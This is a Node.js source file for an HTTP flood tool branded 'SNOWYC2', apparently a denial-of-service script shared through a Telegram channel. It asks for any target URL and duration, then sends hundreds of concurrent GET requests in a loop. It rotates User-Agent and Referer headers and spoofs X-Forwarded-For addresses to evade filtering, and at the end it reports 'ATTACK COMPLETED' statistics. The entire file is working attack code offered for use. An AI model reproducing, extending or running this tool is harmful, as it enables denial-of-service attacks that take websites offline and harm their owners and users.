const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');
const cliProgress = require('cli-progress');
const pLimit = require('p-limit').default; // FIXED import for CommonJS

const MAX_CONCURRENT = Math.min(os.cpus().length * 50, 500);
const REQUEST_TIMEOUT = 10000;

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('uas.txt');

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
        this.limit = pLimit(MAX_CONCURRENT); // FIXED here
    }

    async makeRequest() {
        const headers = {
            'User-Agent': USER_AGENTS.length > 0
                ? USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
                : 'Mozilla/5.0',
            'Referer': REFERERS.length > 0
                ? REFERERS[Math.floor(Math.random() * REFERERS.length)]
                : 'https://google.com',
            'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.')
        };

        try {
            const isHttps = this.target.startsWith('https');
            const response = await axios.get(this.target, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent: keepAliveHttp,
                httpsAgent: keepAliveHttps
            });
            return response.status === 200 ? 'SUCCESS' : 'ERROR';
        } catch {
            return 'ERROR';
        }
    }

    async runAttack() {
        const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
        bar.start(this.duration / 1000, 0);

        const interval = setInterval(() => {
            const elapsed = Date.now() - this.startTime;
            const rps = this.stats.total / (elapsed / 1000);
            this.stats.peakRps = Math.max(this.stats.peakRps, rps);
            bar.update(Math.min(this.duration / 1000, elapsed / 1000));
        }, 1000);

        while (Date.now() - this.startTime < this.duration) {
            const promises = Array.from({ length: MAX_CONCURRENT }, () =>
                this.limit(() => this.makeRequest())
            );

            const results = await Promise.allSettled(promises);

            results.forEach(res => {
                this.stats.total++;
                if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
                    this.stats.success++;
                } else {
                    this.stats.errors++;
                }
            });

            await new Promise(r => setTimeout(r, 200));
        }

        clearInterval(interval);
        bar.stop();
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\nATTACK COMPLETED');
        console.log('='.repeat(60));
        console.log(`TARGET: ${this.target}`);
        console.log(`DURATION: ${elapsed.toFixed(1)}s`);
        console.log(`TOTAL REQUESTS: ${this.stats.total}`);
        console.log(`SUCCESS (200): ${this.stats.success}`);
        console.log(`ERRORS: ${this.stats.errors}`);
        console.log(`AVERAGE RPS: ${avgRps.toFixed(1)}`);
        console.log(`PEAK RPS: ${this.stats.peakRps.toFixed(1)}`);
        console.log('='.repeat(60));
    }
}

// Main
(async () => {
    console.log('\nSNOWYC2 - T.ME/STSVKINGDOM');
    console.log('='.repeat(60));

    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME (seconds): ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack interrupted or failed:", err.message);
    }
})();
